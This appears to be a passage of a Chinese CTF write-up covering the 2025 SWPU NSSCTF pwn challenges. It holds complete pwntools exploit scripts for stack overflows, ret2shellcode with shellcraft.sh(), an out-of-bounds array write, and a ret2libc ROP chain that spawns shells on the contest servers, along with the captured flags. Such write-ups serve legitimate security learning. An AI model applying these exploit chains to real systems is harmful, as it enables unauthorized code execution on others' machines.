+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758954733756-c641bae8-349e-4c2a-b26d-49f7c4d20a5e.png" srcset="/img/loading.gif" lazyload></p>
+<p>NX没开，所以不能构造shellcode</p>
+<p>PIE没开，所以不能直接用地址</p>
+<p>所以我们只能用已经使用过的函数得到基地址，再利用基地址加偏移地址得到shell地址了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758955287767-cc9f8c45-fdb4-4967-b689-628e1e78cb50.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然，利用上述知识，我们也可以直接从main跳到shell，由于相对偏移固定不变，所以我们只要知道main和shell间的相对偏移即可迁移过去</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758955891146-ba9a30ec-1126-48cd-bd74-abbdffa7f0f1.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用ida，我们其实可以直接得到这俩中间差了0x80F-0x770&#x3D;0x9F（readelf读也一样）</p>
+<p>一般地址的字符串输出出来都是十位，0x后边跟8位</p>
+<p>这边我们要做加法，但是截取之后的地址是带着0x的字符串</p>
+<p>所以我们要先int（,16），然后再加9F去</p>
+<p>这边不是0x00000770吗mian地址，所以我们就截断70然后要前边的十位即可</p>
+<p>main_now &#x3D; io.recvuntil(‘70’)[-10:]</p>
+<p>main_addr &#x3D; int(main_now,16)</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956440431-8feef276-3496-46cf-922a-aca7efe69692.png" srcset="/img/loading.gif" lazyload></p>
+<p>别忘了构造溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level = &quot;debug&quot;<br>io=remote(&quot;node7.anna.nssctf.cn&quot;,27715)<br><br>padding=0x28+4<br>main_now = io.recvuntil(&#x27;70&#x27;)[-10:]<br>main_addr = int(main_now,16)<br><br>payload=b&quot;a&quot;*padding+p32(main_addr+0x9F)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956587949-4fda8ecf-0035-4e29-bf62-f79480ad0c9a.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag</p>
+<p>NSSCTF{02f1ff7b-26c3-4cbb-91d4-878d66569199}</p>
+<h2 id="getshell2"><a href="#getshell2" class="headerlink" title="getshell2"></a>getshell2</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956662099-9ac47324-6a2d-44e1-8a5d-29767d0b7ac7.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956775769-a9a995e7-145c-4f6f-b54b-e5325509514c.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边可以看到32位，die就省了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956819047-c7d3b036-31de-410d-a84c-cd2b44ef71bd.png" srcset="/img/loading.gif" lazyload></p>
+<p>溢出点还是蛮好找的，就在main函数里的vulnerable函数</p>
+<p>padding&#x3D;0x18+4</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956946259-a5d86689-fe55-427b-b462-ff6590c19395.png" srcset="/img/loading.gif" lazyload></p>
+<p>system里的内容奇奇怪怪（），但是没有别的&#x2F;bin&#x2F;sh了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ROPgadget --binary service  --string &#x27;/bin/sh&#x27;<br>ROPgadget --binary service  --string &#x27;sh&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>但是搜索可以搜到有’sh’</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758957185481-2cca4b3a-3f96-4dc5-ae6a-a6294bba0c6b.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到sh的地址在0x08048670</p>
+<p>那直接32位传参开始了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level = &quot;debug&quot;<br>io=remote(&quot;node5.anna.nssctf.cn&quot;,29307)<br><br>padding=0x18+4<br>system=0x08048529<br>sh=0x08048670<br><br>payload = b&quot;a&quot;*padding+p32(system)+p32(sh)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758957921688-581021f4-996e-462f-8481-cf08a99eefac.png" srcset="/img/loading.gif" lazyload></p>
+<p>藏的够深的啊</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758957940417-54f1c405-1997-4a96-b63d-bbeab3efacbf.png" srcset="/img/loading.gif" lazyload></p>
+<p>NSSCTF{64d636d0-6ca3-4d28-80de-5d383b93ba0e}</p>
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758957969792-465b5470-339f-491c-82eb-33271f81f56b.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758958337900-9234c967-6d8e-49d8-927e-32bec0c6f6ab.png" srcset="/img/loading.gif" lazyload></p>
+<p>给了个c语言的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include&lt;stdio.h&gt;<br>char buff[256];<br>int main()<br>&#123;<br>    setbuf(stdin,0);<br>    setbuf(stderr,0);<br>    setbuf(stdout,0);<br>    mprotect((long long)(&amp;stdout)&amp;0xfffffffffffff000,0x1000,7);<br>    char buf[256];<br>    memset(buf,0,0x100);<br>    read(0,buf,0x110);<br>    strcpy(buff,buf);<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758958172333-fb556584-564c-4cdb-a44a-5136d6dd4364.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以看似这边是只有NX保护，但是又用mprotect提高了权限，又用strcpy移动到全局变量所在位置，靠着之前的mprotect变的可执行，于是在这样子的协作下成功让shellcode能用了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758958674696-bb56f4be-d00e-49d5-b3ab-500230c09489.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边可以看到了经典的栈溢出漏洞</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758958427855-3f3abac0-e0ea-45ab-b864-26942f84e26e.png" srcset="/img/loading.gif" lazyload></p>
+<p>溢出为padding &#x3D; 0x100+8</p>
+<p>先溢出，然后直接shellcode传上去即可</p>
+<p>构造shellcode：</p>
+<p>shellcode &#x3D; asm(shellcraft.sh())</p>
+<p>由于代码是把buf复制到buff里边</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758961160086-89b7458f-6409-4e34-92c6-1eea4737bafd.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以我们一开始就要输入shellcode，在算上shellcode之后再去溢出，也就是下边这样子</p>
+<p>shellcode.ljust((0x100+0x08),b”a”)</p>
+<p>最后返回p64(buff)</p>
+<p>所以代码也很精简</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)<br>io=remote(&quot;node5.anna.nssctf.cn&quot;,20680)<br><br>shellcode=asm(shellcraft.sh())<br>buff=0x004040A0<br>payload=shellcode.ljust((0x100+8),b&quot;a&quot;)+p64(buff)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>这边这一行很重要context(os&#x3D;’linux’,arch&#x3D;’amd64’,log_level&#x3D;’debug’)</p>
+<p>因为shellcode默认干的是32位的，现在我们需要64位需要强调一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758961468426-65e46c1e-2417-4a78-b86d-4ad2548aa8ec.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758961426826-44b612c5-8e08-4114-bfa5-e2220501500c.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag：</p>
+<p>nssctf{W@rn1ng,Sh31lc0de_inj3ct3r!!!}</p>
+<h2 id="babyarray"><a href="#babyarray" class="headerlink" title="babyarray"></a>babyarray</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758961765033-9317d8f0-9ec6-47a9-9805-fb1e192f39df.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758961897498-23a35fad-3556-4dcb-98bd-555c0b06e72d.png" srcset="/img/loading.gif" lazyload></p>
+<p>64位</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758962043130-e54689a3-a93f-4d1c-97dd-630d605030ed.png" srcset="/img/loading.gif" lazyload></p>
+<p>大概意思是我们写的内容（我觉得得是个数字）会存到v4这个地址，最多写0x4+8个内容</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758962065248-2fd3e663-3e53-40a7-bc4b-ce61f147d562.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后呢，这个数字会拿来乘以4后加6295712</p>
+<p>而我们第二次输入的东西就到这个大数字的地址</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758962342813-e1bd2adb-c612-4536-8bc4-b33f6f13a668.png" srcset="/img/loading.gif" lazyload></p>
+<p>而我们的目标也挺明确，让a&#x3D;0</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758962365702-4f29ece8-85eb-4bb8-8158-a82687234fdb.png" srcset="/img/loading.gif" lazyload></p>
+<p>a现在是恒等于1</p>
+<p>地址为0x0601068</p>
+<p>所以很明确了啊，我们先构造一个能到0x0601068（即6295656）的输入，再写个0输入</p>
+<p>（6295656-6295712）&#x2F;4</p>
+<p>算一下，一开始得输入的是-14</p>
+<p>OK构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)<br>io=remote(&quot;node4.anna.nssctf.cn&quot;,28402)<br><br>io.recvuntil(&quot;index:&quot;)<br>io.sendline(&quot;-14&quot;)<br>io.recvuntil(&quot;value:&quot;)<br>io.sendline(&quot;0&quot;)<br>print(io.recv())<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758963083683-4aaa1257-4de8-4173-b3b2-dc8b41a81fc4.png" srcset="/img/loading.gif" lazyload></p>
+<p>NSSCTF{baby_arr@yxxxx}</p>
+<h2 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758974901415-9853bfba-b55e-41e7-8547-71eb5a77c534.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758975057474-b59d09f6-b43b-4a1c-b89a-c9005a76dea3.png" srcset="/img/loading.gif" lazyload></p>
+<p>提示Ubuntu 18的时候就该知道了，是64位且要注意栈对齐问题</p>
+<p>NX保护了，不能直接构造shellcode，要ROP</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758975386939-10f17c5d-1758-42aa-bb22-4d35c8fb9081.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个程序的内容大概理解一下也是这样子</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758975599756-68738cb2-f5fe-4321-be95-4df0df312c7f.png" srcset="/img/loading.gif" lazyload></p>
+<p>就是先问你三选一，选3没用，选2就继续问，直到你选1</p>
+<p>然后进入加密环节</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758975678191-ff0d07b3-a00f-417a-a260-7b4287ea25c6.png" srcset="/img/loading.gif" lazyload></p>
+<p>解密环节就是先纯异或，这似乎意味着我们可以把密文拿来加密一遍得到答案</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758975768416-f22d36de-7d99-4e07-b148-0aed77413113.png" srcset="/img/loading.gif" lazyload></p>
+<p>额好像有点纰漏，问题不大，不过我没看懂这玩意有啥用这个加密</p>
+<p>主要是这题什么都没有，无system无bin_sh，并且具备着puts函数打印泄露</p>
+<p>所以这一题基本上考虑就是泄露+ret2libc的结合</p>
+<p>加密函数或许是为了给这个gets函数吧，拿来栈溢出用</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758976053333-08c62b51-1747-4bbb-9898-a3f20467b9b1.png" srcset="/img/loading.gif" lazyload></p>
+<p>栈溢出的大小是0x50+8</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758976079992-be47c2f5-1a67-4d9e-8b39-92066cff729b.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边我们发现程序多次运用puts函数，因此可以利用puts函数来泄露libc地址</p>
+<p>构造payload1还需要注意栈对齐，这边利用命令搜索一下rdi和ret的地址</p>
+<p>ROPgadget –binary “pwn” –only “pop|ret”</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758976879670-e6755256-165a-4791-b360-3c30ece1ac8c.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以rdi&#x3D;0x0400c83</p>
+<p>ret&#x3D;0x04006b9</p>
+<p>然后我们即可构造payload1</p>
+<p>payload1&#x3D;b”a”*padding+p64(rdi)+p64(puts_got)+p64(ret)+p64(puts_plt)+p64(main)</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758976998026-a6b9f055-49c0-4a82-9dc1-942a44acb0b8.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边就是上述的payload1大概的内容</p>
+<p>注意因为我们这边的栈溢出靠的是gets函数，我们需要有一个gets函数的地方，而这个地方在encrypted函数内部</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758976053333-08c62b51-1747-4bbb-9898-a3f20467b9b1.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以我们这边需要注意一下sendline的地址，打好断点</p>
+<p>先定位Input your choice!然后输入1</p>
+<p>等再一次定位到encrypted说明进入内部了，这个时候再放payload1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">io.recvuntil(&quot;Input your choice!\n&quot;)<br>io.sendline(&quot;1&quot;)<br>io.recvuntil(&quot;encrypted&quot;)<br>io.sendline(payload1)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">io.sendlineafter(&#x27;Input your choice!\n&#x27;,b&#x27;1&#x27;)<br>io.sendlineafter(&#x27;encrypted&#x27;,pay)<br></code></pre></td></tr></table></figure>
+
+<p>发完payload1后就要开始搭建2了</p>
+<p>这边直接照例截断</p>
+<p>puts&#x3D;u64(io.recvuntil(b’\x7f’)[-6:].ljust(8, b’\x00’))</p>
+<p>得到puts的真实地址，因为64位需要截取往前6个字节的数据，数据后方需要补零.ljust(8, b”\x00”))补零之后才能被u64进行小端序转换</p>
+<p>得到之后我们直接利用libcsearcher去得到libc库</p>
+<p>然后利用puts算出基地址后利用这个得到system和&#x2F;bin&#x2F;sh</p>
+<p>这边主要麻烦的还是栈对齐问题，这个是心腹大患，我感觉我没法很好的处理，目前一直是在疯狂试错</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759019393670-47a72b4f-2b7b-4e05-93bd-207c95cc982c.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759019603130-cf86e32f-e1e2-4652-9bc8-875d724e26e1.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759019719756-df21ceba-1c5c-4c04-8d5a-f6e5b4def037.png" srcset="/img/loading.gif" lazyload></p>
+<p>好吧可以动调然后来看调用的函数看看最后的空间地址是不是8结尾的，是的话得加ret</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>from LibcSearcher import *<br>context (os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>elf=ELF(&quot;./pwn&quot;)<br>io=remote(&quot;node5.anna.nssctf.cn&quot;,24164)<br><br>main = elf.symbols[&quot;main&quot;]<br>puts_plt = elf.plt[&quot;puts&quot;]<br>puts_got = elf.got[&quot;puts&quot;]<br>padding=0x50+8<br><br>rdi=0x0400c83<br>ret=0x04006b9<br><br>payload1=b&quot;a&quot;*padding+p64(rdi)+p64(puts_got)+p64(ret)*2+p64(puts_plt)+p64(main)<br>#这边的p64(ret)是可以不写的，毕竟乘2和0是一样的<br>io.recvuntil(&quot;Input your choice!\n&quot;)<br>io.sendline(b&quot;1&quot;)<br>io.recvuntil(&quot;encrypted&quot;)<br>io.sendline(payload1)<br><br>puts=u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>libc=LibcSearcher(&quot;puts&quot;,puts)<br>libc_base=puts-libc.dump(&quot;puts&quot;)<br>system=libc_base+libc.dump(&quot;system&quot;)<br>bin_sh=libc_base+libc.dump(&quot;str_bin_sh&quot;)<br><br>payload2=b&quot;a&quot;*padding+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>io.sendlineafter(&#x27;Input your choice!\n&#x27;,b&#x27;1&#x27;)<br>io.sendlineafter(&#x27;encrypted&#x27;,payload2)<br>#用前边的先recvuntil再sendline也一样<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758979155744-ba485ecf-2602-4afa-bdc9-f29b4a4707cc.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功得到flag：NSSCTF{d637db40-0b4e-45d9-bda3-286d44f6654c}</p>
+<h2 id="ezr0p32"><a href="#ezr0p32" class="headerlink" title="ezr0p32"></a>ezr0p32</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055512794-ae73909e-0377-45bb-bb50-a5ead3a63ce2.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055503240-5accaaea-31f2-4884-8c4c-848bf6687e9b.png" srcset="/img/loading.gif" lazyload></p>
+<p>32位，看看main函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055542536-35bb9887-2a45-4e93-941b-f7aaf43002ea.png" srcset="/img/loading.gif" lazyload></p>
+<p>system函数在这边，溢出点也在这边</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055567288-499f4095-42dc-4430-9c52-8a2641b76ee9.png" srcset="/img/loading.gif" lazyload></p>
+<p>padding&#x3D;0x1C+4</p>
+<p>那很明确了，只差一个&#x2F;bin&#x2F;sh，先搜搜看吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ROPgadget --binary pwn  --string &#x27;/bin/sh&#x27;<br>ROPgadget --binary pwn  --string &#x27;sh&#x27;<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055633045-a0db06b8-0326-4fb0-af02-dc0469f855f2.png" srcset="/img/loading.gif" lazyload></p>
+<p>什么都没有欸，而且题目说不要用libc</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055734310-2d0e63ec-8715-4763-a3c7-cf375761a611.png" srcset="/img/loading.gif" lazyload></p>
+<p>你看第一个这边还有一个buf，是无栈溢出漏洞的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055771722-1188706c-b68a-4386-bfb3-446132178135.png" srcset="/img/loading.gif" lazyload></p>
+<p>而且ctrl+s搜索之后发现这一块是可写的，我们不需要执行，只要可写就好了</p>
+<p>那事情就简单了，先打断点，直接往这边写&#x2F;bin&#x2F;sh</p>
+<p>然后再往下走，走到栈溢出漏洞所在处，构造栈溢出漏洞，然后32位传参即可</p>
+<p>好我们直接写代码</p>
+<p>需要的地址：</p>
+<p>bss_addr&#x3D;0x0804A080</p>
+<p>system&#x3D;0x080483D0</p>
+<p>OK了，写代码去了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level=&quot;debug&quot;<br>io=remote(&quot;node5.anna.nssctf.cn&quot;,25750)<br><br>bss_addr=0x0804A080<br>system=0x080483D0<br>padding=0x1C+4<br><br>io.recvuntil(b&quot;name&quot;)<br>io.sendline(b&quot;/bin/sh&quot;)<br><br>io.recvuntil(b&quot;now it&#x27;s your play time~&quot;)<br>payload=b&quot;a&quot;*padding+p32(system)+p32(0)+p32(bss_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759056357576-e15b376d-6958-46b9-97b7-2a0c855423fb.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag：nssctf{L3arn_R0p_1s_3@5y_but_k33p_is_c00l}</p>
+<h2 id="ezcmp"><a href="#ezcmp" class="headerlink" title="ezcmp"></a>ezcmp</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759062551606-21ee8f47-ed32-4f2f-b26f-f01f9a70e0d2.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759062658780-b1f1dd54-3e44-4371-934d-4b7103da466d.png" srcset="/img/loading.gif" lazyload></p>
+<p>一道动调题</p>
+<p>给了一个c</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759062613766-42e4eace-302d-40f6-9c73-b6f93da0c864.png" srcset="/img/loading.gif" lazyload></p>
+<p>是一串加密的代码，这边strcpy会把后边那一串传给buff</p>
+<p>然后又去加密buff</p>
+<p>最后是用buff和我们的输入去比较，只要相同成功就有system(“&#x2F;bin&#x2F;sh”)；了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759062716734-1f6653ec-8c39-48ee-8d93-5baf129879d4.png" srcset="/img/loading.gif" lazyload></p>
+<p>为什么说是一道动调题，主要还是因为这边加密的内容其实是固定的</p>
+<p>所以我们是可以动调结束看看最后的加密内容的，然后直接输入加密结果去和加密结果比，肯定一模一样啊</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">chmod 777 ezcmp改一下属性先，不然跑不起来<br>gdb ezcmp<br>break main打断点<br>run跑起来<br>n一直步过<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759063087281-963415c4-5ef6-4fdf-a489-764e4ba67cb5.png" srcset="/img/loading.gif" lazyload></p>
+<p>一直过到这个strncmp的比较环节</p>
+<p>这边可以看到buff的地址，就在下边一行</p>
+<p>我们要看的自然是这个下边的内容</p>
+<p>直接输入<code>x/10gx 0x404100</code>可以查看0x404100即往下数的 ，10个地址的数据（多点，避免看少了）</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759063178037-4091f055-6364-4741-b006-272f090d217c.png" srcset="/img/loading.gif" lazyload></p>
+<p>OK啊我们直接复制粘贴payload进去就是了</p>
+<p>0x144678aadc0e4072	0x84b6e81a4c7eb0e2</p>
